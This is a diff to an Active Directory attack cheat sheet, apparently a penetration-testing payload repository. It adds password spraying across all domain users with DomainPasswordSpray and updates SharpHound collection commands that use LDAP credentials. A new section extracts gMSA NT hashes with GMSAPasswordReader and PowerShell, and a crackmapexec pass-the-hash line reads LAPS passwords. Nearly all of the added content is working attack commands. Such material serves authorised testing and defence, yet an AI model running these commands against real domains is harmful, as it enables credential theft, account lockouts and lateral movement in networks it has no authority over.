@@ -37,6 +37,7 @@
       - [Spray passwords against the RDP service](#spray-passwords-against-the-rdp-service)
     - [Password in AD User comment](#password-in-ad-user-comment)
     - [Reading LAPS Password](#reading-laps-password)
+    - [Reading GMSA Password](#reading-gmsa-password)
     - [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
       - [Using Mimikatz](#using-mimikatz)
       - [Using Meterpreter](#using-meterpreter)
@@ -195,12 +196,12 @@ use [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 # run the collector on the machine using SharpHound.exe
 # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
 # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
-.\SharpHound.exe (from resources/Ingestor)
-.\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
-.\SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
 .\SharpHound.exe -c all -d active.htb -SearchForest
 .\SharpHound.exe --EncryptZip --ZipFilename export.zip
-.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
+.\SharpHound.exe -c all,GPOLocalGroup
+.\SharpHound.exe -c all --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
+.\SharpHound.exe -c all -d active.htb --LDAPUser <UserName> --LDAPPass <Password> --domaincontroller 10.10.10.100
+
 
 # or run the collector on the machine using Powershell
 # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
@@ -221,6 +222,9 @@ root@payload$ apt install bloodhound
 
 # start BloodHound and the database
 root@payload$ neo4j console
+# or use docker
+root@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j
+
 root@payload$ ./bloodhound --no-sandbox
 Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
 ```
@@ -988,6 +992,17 @@ Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB
 crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
 ```
 
+Using `DomainPasswordSpray` to spray a password against all users of a domain.
+
+```powershell
+# https://github.com/dafthack/DomainPasswordSpray
+Invoke-DomainPasswordSpray -Password Summer2021!
+
+# /!\ be careful with the account lockout !
+Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
+
+```
+
 #### Spray passwords against the RDP service
 
 Using RDPassSpray to target RDP services.
@@ -1019,6 +1034,35 @@ or dump the Active Directory and `grep` the content.
 ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
 ```
 
+### Reading GMSA Password
+
+> User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically changed.
+
+#### GMSA Attributes in the Active Directory 
+* **msDS-GroupMSAMembership** (PrincipalsAllowedToRetrieveManagedPassword) - stores the security principals that can access the GMSA password.
+* **msds-ManagedPassword** - This attribute contains a BLOB with password information for group-managed service accounts.
+* **msDS-ManagedPasswordId** - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
+* **msDS-ManagedPasswordInterval** - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
+
+
+#### Extract NT hash from the Active Directory
+
+* GMSAPasswordReader (C#)
+  ```ps1
+  # https://github.com/rvazarkar/GMSAPasswordReader
+  GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
+  ```
+
+* Active Directory Powershell
+  ```ps1
+  $gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
+  $blob = $gmsa.'msDS-ManagedPassword'
+  $mp = ConvertFrom-ADManagedPasswordBlob $blob
+  $hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
+  ```
+
+* [gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) based on Active Directory PowerShell module
+
 
 ### Reading LAPS Password
 
@@ -1035,6 +1079,11 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
 #### Extract LAPS password
 
 > The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users
+
+* CrackMapExec
+    ```powershell
+    crackmapexec smb 10.10.10.10 -u user -H 8846f7eaee8fb117ad06bdd830b7586c -M laps
+    ```
 
 * Powerview
     ```powershell
